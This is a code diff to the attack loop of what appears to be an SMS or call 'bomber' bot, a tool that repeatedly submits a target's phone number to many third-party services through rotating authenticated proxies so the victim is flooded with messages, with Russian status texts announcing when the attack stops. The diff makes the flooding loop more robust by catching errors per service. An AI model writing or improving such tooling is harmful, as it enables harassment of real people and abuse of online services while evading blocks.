@@ -24,7 +24,7 @@ class Phone:
         self.phone = phone
         self.count_circles: str = None
         self.bomber_data: BomberData = None
-        self.session: ClientSession = None # ClientSession()
+        self.session: ClientSession = ClientSession()
         self.headers = {"User-Agent": (
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) "
@@ -62,50 +62,48 @@ class Phone:
         self.count_circles = self.bomber_data.circles
         self.services = self.load_services()
         logger.info("Attack started -> %s" % (self.user_id,))
-        try:
-            while self.is_process:
-                proxy = self.proxy_format(choice(self.load_proxies()))
-                async with ClientSession() as self.session:
-                    proxy_auth = BasicAuth(proxy["username"], proxy["password"])
-                    for k,v in self.services.items():
-                        if not v["formating"]:
-                            if "data" in v:
-                                data = (v["data"] % self.phone[-10:]).replace("'", "\"")
-                                await self.session.post(url=k, data=loads(data),
-                                    headers=self.headers, timeout=3,
-                                    proxy=proxy["url"], proxy_auth=proxy_auth)
-                            elif "json" in v:
-                                json = (v["json"] % self.phone[-10:]).replace("'", "\"")
-                                await self.session.post(url=k, json=loads(json),
-                                    headers=self.headers, timeout=3,
-                                    proxy=proxy["url"], proxy_auth=proxy_auth)
-                        else:
-                            await self.session.post(url=k % self.phone, timeout=3,
+        while self.is_process:
+            proxy = self.proxy_format(choice(self.load_proxies()))
+            proxy_auth = BasicAuth(proxy["username"], proxy["password"])
+            for k,v in self.services.items():
+                try:
+                    if not v["formating"]:
+                        if "data" in v:
+                            data = (v["data"] % self.phone[-10:]).replace("'", "\"")
+                            response = await self.session.post(url=k, data=loads(data),
+                                headers=self.headers, timeout=3,
                                 proxy=proxy["url"], proxy_auth=proxy_auth)
+                        elif "json" in v:
+                            json = (v["json"] % self.phone[-10:]).replace("'", "\"")
+                            await self.session.post(url=k, json=loads(json),
+                                headers=self.headers, timeout=3,
+                                proxy=proxy["url"], proxy_auth=proxy_auth)
+                    else:
+                        await self.session.post(url=k % self.phone, timeout=3,
+                            proxy=proxy["url"], proxy_auth=proxy_auth)
+                except RuntimeError:
+                    pass
+                except ClientHttpProxyError as e:
+                    proxy = f"%s@%s:%s" % (proxy["url"], proxy["username"], proxy["password"],)
+                    logger.error(f"Proxy: {proxy}, , Error message -> {e}")
+                except Exception as e:
+                    error_name = e.__class__.__name__
+                    if e.args:
+                        error_message = e.args[0]
+                    else:
+                        error_message = "Unknow error"
+                    logger.error(f"{error_name} -> {error_message}")
 
-                if self.count_circles!="∞":
-                    self.count_circles = int(self.count_circles) - 1
-                    if self.count_circles == 0:
-                        await self.bomber_data.update(circles=self.count_circles)
-                        return await message.answer(text="❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
-                await sleep(3)
-        except ClientHttpProxyError as e:
-            proxy = f"%s@%s:%s" % (proxy["url"], proxy["username"], proxy["password"],)
-            logger.error(f"Proxy: {proxy}, , Error message -> {e}")
-        except Exception as e:
-            logger.error(e.args[0])
-            error_name = e.__class__.__name__
-            if error_name != "TimeoutError":
-                await self.session.close()
-                await self.bomber_data.update(circles=str(self.count_circles))
-                return await bot.edit_message_text(chat_id=message.from_user.id, message_id=message.message_id+1,
-                                    text=f"<b><i>Error message</i></b>: {e.args[0]}")
-            else:
-                await self.session.close()
+            if self.count_circles!="∞":
+                self.count_circles = int(self.count_circles) - 1
+                if self.count_circles == 0:
+                    await self.bomber_data.update(circles=self.count_circles)
+                    return await message.answer(text="❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
+            await sleep(3)
 
     async def stop(self):
-        self.is_process = False
         await sleep(1)
+        self.is_process = False
         if self.session is not None:
             logger.info("Attack stopped -> %s" % (self.user_id,))
-            return await self.session.close()
+            await self.session.close()
